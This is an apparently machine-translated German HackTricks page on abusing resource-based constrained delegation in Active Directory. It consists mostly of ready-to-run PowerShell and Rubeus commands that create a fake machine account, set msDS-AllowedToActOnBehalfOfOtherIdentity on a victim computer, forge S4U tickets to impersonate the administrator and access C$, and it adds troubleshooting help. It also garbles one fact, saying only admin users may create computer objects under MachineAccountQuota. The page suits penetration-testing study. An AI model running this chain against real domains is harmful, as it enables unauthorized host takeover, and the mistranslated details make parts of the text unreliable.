# Ressourcenbasierte eingeschränkte Delegierung

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks im PDF-Format herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegramm-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-Repositories einreichen.

</details>

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Grundlagen der ressourcenbasierten eingeschränkten Delegierung

Dies ähnelt der grundlegenden [Eingeschränkten Delegierung](constrained-delegation.md), aber **anstatt** Berechtigungen an ein **Objekt zu geben, um sich als beliebiger Benutzer gegenüber einem Dienst auszugeben**. Bei der ressourcenbasierten eingeschränkten Delegierung **legt das Objekt fest, wer sich als beliebiger Benutzer gegenüber ihm ausgeben kann**.

In diesem Fall wird das eingeschränkte Objekt ein Attribut namens _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ mit dem Namen des Benutzers haben, der sich als jeden anderen Benutzer gegenüber ihm ausgeben kann.

Ein weiterer wichtiger Unterschied dieser eingeschränkten Delegierung zu den anderen Delegierungen besteht darin, dass jeder Benutzer mit **Schreibberechtigungen über ein Maschinenkonto** (_GenericAll/GenericWrite/WriteDacl/WriteProperty/etc_) das _**msDS-AllowedToActOnBehalfOfOtherIdentity**_ setzen kann (Bei den anderen Formen der Delegierung benötigten Sie Domänenadministratorrechte).

### Neue Konzepte

In der eingeschränkten Delegierung wurde erwähnt, dass die **`TrustedToAuthForDelegation`**-Flagge im _userAccountControl_-Wert des Benutzers benötigt wird, um ein **S4U2Self** durchzuführen. Aber das ist nicht ganz richtig.\
Die Realität ist, dass Sie auch ohne diesen Wert ein **S4U2Self** gegen jeden Benutzer durchführen können, wenn Sie ein **Dienst** sind (eine SPN haben). Wenn Sie jedoch **`TrustedToAuthForDelegation`** haben, wird das zurückgegebene TGS **Forwardable** sein, und wenn Sie diese Flagge **nicht haben**, wird das zurückgegebene TGS **nicht** Forwardable sein.

Wenn das in **S4U2Proxy** verwendete **TGS** **NICHT Forwardable** ist und Sie versuchen, eine **grundlegende eingeschränkte Delegierung** auszunutzen, wird es **nicht funktionieren**. Wenn Sie jedoch versuchen, eine **ressourcenbasierte eingeschränkte Delegierung zu nutzen, wird es funktionieren** (das ist keine Schwachstelle, sondern anscheinend ein Feature).

### Angriffsstruktur

> Wenn Sie **Schreibäquivalente Berechtigungen** über ein **Computer**-Konto haben, können Sie **privilegierten Zugriff** auf diese Maschine erhalten.

Angenommen, der Angreifer hat bereits **Schreibäquivalente Berechtigungen über das Opfer-Computerkonto**.

1. Der Angreifer **kompromittiert** ein Konto, das eine **SPN** hat oder erstellt eine ("Dienst A"). Beachten Sie, dass **jeder** _Admin-Benutzer_ ohne andere spezielle Berechtigung bis zu 10 **Computerobjekte (**_**MachineAccountQuota**_**)** erstellen und diesen eine SPN setzen kann. Der Angreifer kann also einfach ein Computerobjekt erstellen und eine SPN setzen.
2. Der Angreifer **missbraucht seine SCHREIB-Berechtigung** über den Opfercomputer (Dienst B), um eine **ressourcenbasierte eingeschränkte Delegierung zu konfigurieren, die es Dienst A ermöglicht, sich als beliebiger Benutzer gegenüber diesem Opfercomputer (Dienst B) auszugeben**.
3. Der Angreifer verwendet Rubeus, um einen **vollständigen S4U-Angriff** (S4U2Self und S4U2Proxy) von Dienst A auf Dienst B für einen Benutzer **mit privilegiertem Zugriff auf Dienst B** durchzuführen.
1. S4U2Self (vom kompromittierten/erstellten Konto mit SPN): Fordern Sie ein **TGS des Administrators für mich** an (Nicht Forwardable).
2. S4U2Proxy: Verwenden Sie das **nicht Forwardable TGS** des vorherigen Schritts, um ein **TGS** vom **Administrator** zum **Opferhost** anzufordern.
3. Selbst wenn Sie ein nicht Forwardable TGS verwenden, da Sie eine ressourcenbasierte eingeschränkte Delegierung ausnutzen, wird es funktionieren.
4. Der Angreifer kann das **Ticket weitergeben** und den Benutzer **imitieren**, um **Zugriff auf den Opferdienst B zu erhalten**.

Um das _**MachineAccountQuota**_ der Domäne zu überprüfen, können Sie verwenden:
```powershell
Get-DomainObject -Identity "dc=domain,dc=local" -Domain domain.local | select MachineAccountQuota
```
## Angriff

### Erstellen eines Computerobjekts

Sie können ein Computerobjekt innerhalb der Domäne mithilfe von [powermad](https://github.com/Kevin-Robertson/Powermad)**:**
```powershell
import-module powermad
New-MachineAccount -MachineAccount SERVICEA -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose

# Check if created
Get-DomainComputer SERVICEA
```
### Konfigurieren der Ressourcenbasierten Eingeschränkten Delegierung

**Verwendung des Active Directory PowerShell-Moduls**
```powershell
Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount SERVICEA$ #Assing delegation privileges
Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
```
**Mit Powerview verwenden**
```powershell
$ComputerSid = Get-DomainComputer FAKECOMPUTER -Properties objectsid | Select -Expand objectsid
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)
Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}

#Check that it worked
Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'

msds-allowedtoactonbehalfofotheridentity
----------------------------------------
{1, 0, 4, 128...}
```
### Durchführung eines vollständigen S4U-Angriffs

Zunächst haben wir das neue Computerobjekt mit dem Passwort `123456` erstellt, daher benötigen wir den Hash dieses Passworts:
```bash
.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
```
Dies druckt die RC4- und AES-Hashes für dieses Konto aus.\
Nun kann der Angriff durchgeführt werden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
```
Sie können mehr Tickets generieren, indem Sie einmal den `/altservice`-Parameter von Rubeus verwenden:
```bash
rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
```
{% hint style="danger" %}
Beachten Sie, dass Benutzer ein Attribut namens "**Kann nicht delegiert werden**" haben. Wenn ein Benutzer dieses Attribut auf True hat, können Sie ihn nicht übernehmen. Diese Eigenschaft kann in Bloodhound eingesehen werden.
{% endhint %}

### Zugriff

Der letzte Befehl wird den **kompletten S4U-Angriff durchführen und das TGS** vom Administrator zum Opferhost im **Speicher** injizieren.\
In diesem Beispiel wurde ein TGS für den **CIFS**-Dienst vom Administrator angefordert, sodass Sie auf **C$** zugreifen können:
```bash
ls \\victim.domain.local\C$
```
### Missbrauch verschiedener Diensttickets

Erfahren Sie mehr über die [**verfügbaren Diensttickets hier**](silver-ticket.md#available-services).

## Kerberos-Fehler

* **`KDC_ERR_ETYPE_NOTSUPP`**: Dies bedeutet, dass Kerberos so konfiguriert ist, dass DES oder RC4 nicht verwendet werden, und Sie nur den RC4-Hash bereitstellen. Geben Sie Rubeus mindestens den AES256-Hash (oder geben Sie ihm einfach die RC4-, AES128- und AES256-Hashes). Beispiel: `[Rubeus.Program]::MainString("s4u /user:FAKECOMPUTER /aes256:CC648CF0F809EE1AA25C52E963AC0487E87AC32B1F71ACC5304C73BF566268DA /aes128:5FC3D06ED6E8EA2C9BB9CC301EA37AD4 /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:Administrator /msdsspn:CIFS/M3DC.M3C.LOCAL /ptt".split())`
* **`KRB_AP_ERR_SKEW`**: Dies bedeutet, dass die Zeit des aktuellen Computers von der des DC abweicht und Kerberos nicht ordnungsgemäß funktioniert.
* **`preauth_failed`**: Dies bedeutet, dass der angegebene Benutzername + Hashes nicht funktionieren, um sich anzumelden. Möglicherweise haben Sie vergessen, das "$" im Benutzernamen zu setzen, wenn Sie die Hashes generieren (`.\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local`)
* **`KDC_ERR_BADOPTION`**: Dies kann bedeuten:
* Der Benutzer, den Sie zu imitieren versuchen, kann nicht auf den gewünschten Dienst zugreifen (weil Sie ihn nicht imitieren können oder weil er nicht genügend Berechtigungen hat)
* Der angeforderte Dienst existiert nicht (wenn Sie ein Ticket für WinRM anfordern, aber WinRM nicht ausgeführt wird)
* Der erstellte Fakecomputer hat seine Berechtigungen über dem verwundbaren Server verloren und Sie müssen sie zurückgeben.

## Referenzen

* [https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html](https://shenaniganslabs.io/2019/01/28/Wagging-the-Dog.html)
* [https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/](https://www.harmj0y.net/blog/redteaming/another-word-on-delegation/)
* [https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution#modifying-target-computers-ad-object)
* [https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/](https://stealthbits.com/blog/resource-based-constrained-delegation-abuse/)

<figure><img src="/.gitbook/assets/WebSec_1500x400_10fps_21sn_lightoptimized_v2.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Erfahren Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere Möglichkeiten, HackTricks zu unterstützen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen möchten** oder **HackTricks als PDF herunterladen möchten**, überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** 💬 [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
